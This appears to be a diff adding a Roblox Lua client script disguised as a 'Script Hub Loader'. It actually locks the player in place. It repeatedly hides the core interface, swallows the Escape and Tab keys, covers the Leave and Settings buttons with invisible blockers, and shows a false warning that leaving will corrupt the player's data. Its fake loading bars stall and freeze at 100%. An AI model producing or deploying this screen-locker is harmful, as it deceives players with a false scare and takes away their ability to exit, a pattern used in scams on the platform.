@@ -1,0 +1,216 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
+local ContextActionService = game:GetService("ContextActionService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- 🛡️ Disable everything repeatedly (mobile-safe)
+RunService.RenderStepped:Connect(function()
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+		StarterGui:SetCore("TopbarEnabled", false)
+	end)
+end)
+
+-- 🛑 Block Escape and Tab
+ContextActionService:BindAction("BlockEscape", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape, Enum.KeyCode.Tab)
+
+-- 🧱 Fullscreen input-blocker (invisible, Modal = true)
+local blocker = Instance.new("TextButton")
+blocker.Name = "InputBlocker"
+blocker.Size = UDim2.new(1, 0, 1, 36) -- Covers whole screen + topbar offset
+blocker.Position = UDim2.new(0, 0, 0, -36) -- Move up to block top buttons
+blocker.BackgroundTransparency = 1
+blocker.Text = ""
+blocker.AutoButtonColor = false
+blocker.Modal = true
+blocker.ZIndex = 9999
+blocker.Parent = playerGui
+
+-- 🧱 Extra Physical Frame blocker for top corners (for Leave/Settings on mobile)
+local topRightCover = Instance.new("Frame")
+topRightCover.Size = UDim2.new(0, 300, 0, 80)
+topRightCover.Position = UDim2.new(1, -300, 0, 0)
+topRightCover.BackgroundTransparency = 1
+topRightCover.ZIndex = 9998
+topRightCover.Parent = playerGui
+
+local topLeftCover = topRightCover:Clone()
+topLeftCover.Position = UDim2.new(0, 0, 0, 0)
+topLeftCover.Parent = playerGui
+
+-- 🧹 Remove old GUI if it exists
+if playerGui:FindFirstChild("CustomUI") then
+	playerGui.CustomUI:Destroy()
+end
+
+-- GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CustomUI"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.DisplayOrder = 999
+screenGui.Parent = playerGui
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+bg.BorderSizePixel = 0
+bg.ZIndex = 0
+bg.Parent = screenGui
+
+-- Animated gradient
+local uiGradient = Instance.new("UIGradient", bg)
+uiGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 60, 60)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
+}
+task.spawn(function()
+	while screenGui.Parent do
+		uiGradient.Rotation = (uiGradient.Rotation + 0.05) % 360
+		task.wait(0.01)
+	end
+end)
+
+-- Utility: Shadow text
+local function addShadowText(label)
+	local shadow = label:Clone()
+	shadow.TextColor3 = Color3.new(0, 0, 0)
+	shadow.TextTransparency = 0.8
+	shadow.ZIndex = label.ZIndex - 1
+	shadow.Position = label.Position + UDim2.new(0, 2, 0, 2)
+	shadow.Name = label.Name .. "_Shadow"
+	shadow.Parent = label.Parent
+end
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.3, 0)
+title.Text = "Script Hub Loader"
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.FredokaOne
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 48
+title.ZIndex = 5
+title.Parent = screenGui
+addShadowText(title)
+
+-- Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Size = UDim2.new(1, 0, 0.05, 0)
+subtitle.Position = UDim2.new(0, 0, 0.37, 0)
+subtitle.Text = "made by pr1m0"
+subtitle.BackgroundTransparency = 1
+subtitle.Font = Enum.Font.FredokaOne
+subtitle.TextColor3 = Color3.new(1, 1, 1)
+subtitle.TextSize = 20
+subtitle.ZIndex = 5
+subtitle.Parent = screenGui
+addShadowText(subtitle)
+
+-- Warning
+local warningText = Instance.new("TextLabel")
+warningText.Size = UDim2.new(1, 0, 0.05, 0)
+warningText.Position = UDim2.new(0, 0, 0.93, 0)
+warningText.Text = "⚠ Leaving the game may corrupt your data!"
+warningText.BackgroundTransparency = 1
+warningText.Font = Enum.Font.FredokaOne
+warningText.TextColor3 = Color3.fromRGB(255, 100, 100)
+warningText.TextSize = 20
+warningText.ZIndex = 5
+warningText.Parent = screenGui
+addShadowText(warningText)
+
+-- Loading Bar
+local function createCartoonLoadingBar(duration, labelText, callback, isFinal)
+	local container = Instance.new("Frame")
+	container.Size = UDim2.new(0.5, 0, 0.07, 0)
+	container.Position = UDim2.new(0.25, 0, 0.5, 0)
+	container.BackgroundTransparency = 1
+	container.ZIndex = 10
+	container.Parent = screenGui
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, 0, 0.4, 0)
+	label.Position = UDim2.new(0, 0, -0.6, 0)
+	label.Text = labelText or "Loading..."
+	label.BackgroundTransparency = 1
+	label.Font = Enum.Font.FredokaOne
+	label.TextColor3 = Color3.new(1, 1, 1)
+	label.TextSize = 20
+	label.ZIndex = 10
+	label.Parent = container
+	addShadowText(label)
+
+	local bg = Instance.new("ImageLabel")
+	bg.Size = UDim2.new(1, 0, 0.6, 0)
+	bg.Position = UDim2.new(0, 0, 0.4, 0)
+	bg.BackgroundTransparency = 1
+	bg.Image = "rbxassetid://607247449"
+	bg.ScaleType = Enum.ScaleType.Slice
+	bg.SliceCenter = Rect.new(10, 10, 90, 90)
+	bg.ZIndex = 10
+	bg.Parent = container
+
+	local fill = Instance.new("Frame")
+	fill.Size = UDim2.new(0, 0, 1, 0)
+	fill.BackgroundColor3 = Color3.fromRGB(102, 255, 102)
+	fill.BorderSizePixel = 0
+	fill.BackgroundTransparency = 0.2
+	fill.ZIndex = 11
+	fill.Parent = bg
+
+	Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
+	Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 12)
+
+	local percent = Instance.new("TextLabel")
+	percent.Size = UDim2.new(1, 0, 1, 0)
+	percent.BackgroundTransparency = 1
+	percent.Text = "0%"
+	percent.Font = Enum.Font.FredokaOne
+	percent.TextColor3 = Color3.new(1, 1, 1)
+	percent.TextSize = 16
+	percent.ZIndex = 12
+	percent.Parent = bg
+	addShadowText(percent)
+
+	task.spawn(function()
+		local current = 0
+		local stucks = {20, 60, 95}
+		for i = 1, 100 do
+			current = i
+			fill.Size = UDim2.new(current / 100, 0, 1, 0)
+			percent.Text = current .. "%"
+			if table.find(stucks, i) then
+				task.wait(1)
+			else
+				task.wait(duration / 100)
+			end
+		end
+
+		if isFinal then
+			percent.Text = "100%"
+			fill.Size = UDim2.new(1, 0, 1, 0)
+			if callback then callback() end
+			return
+		end
+
+		task.wait(0.5)
+		TweenService:Create(container, TweenInfo.new(0.5), {Position = UDim2.new(0.25, 0, 1.2, 0)}):Play()
+		task.wait(0.5)
+		container:Destroy()
+		if callback then callback() end
+	end)
+end
+
+-- Start loading
+createCartoonLoadingBar(5, "Fetching Available Scripts...", function()
+	createCartoonLoadingBar(60, "Finalizing Scripts...", nil, true)
+end)
